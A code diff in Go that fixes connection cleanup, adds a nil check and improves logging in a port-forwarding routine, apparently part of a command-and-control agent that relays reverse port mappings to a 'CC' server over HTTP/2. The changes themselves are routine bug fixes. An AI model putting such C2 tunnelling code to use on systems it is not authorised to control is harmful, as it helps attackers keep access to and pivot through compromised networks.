@@ -152,7 +152,9 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	// remember to cleanup
 	defer func() {
 		cancel()
-		conn.Close()
+		if conn != nil {
+			conn.Close()
+		}
 		delete(PortFwds, sessionID)
 		log.Printf("PortFwd stopped: %s (%s)", addr, sessionID)
 	}()
@@ -189,12 +191,12 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			return
 		}
 		defer func() {
-			defer h2cancel()
 			_, _ = h2.Write([]byte("exit\n"))
+			h2cancel()
+			conn.Close()
 		}()
 
-		// tell CC this is a subsession (same mapping but different h2 req)
-		// sub-session (streamHandler) ID
+		// tell CC this is a reversed port mapping
 		shID := fmt.Sprintf("%s_%d-reverse", sessionID, RandInt(0, 1024))
 		_, err = h2.Write([]byte(shID))
 		if err != nil {
@@ -204,19 +206,21 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 
 		// iocopy
 		go func() {
-			defer conn.Close()
 			_, err = io.Copy(conn, h2)
 			if err != nil {
 				log.Printf("h2 -> conn: %v", err)
 			}
 		}()
 		go func() {
-			defer conn.Close()
 			_, err = io.Copy(h2, conn)
 			if err != nil {
 				log.Printf("conn -> h2: %v", err)
 			}
 		}()
+
+		for ctx.Err() == nil {
+			time.Sleep(100 * time.Millisecond)
+		}
 	}
 
 	// listen
@@ -237,7 +241,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	for ctx.Err() == nil {
 		conn, err := l.Accept()
 		if err != nil {
-			log.Print(err)
+			log.Printf("Listening on 0.0.0.0:%s: %v", port, err)
 			continue
 		}
 		go serveConn(conn)
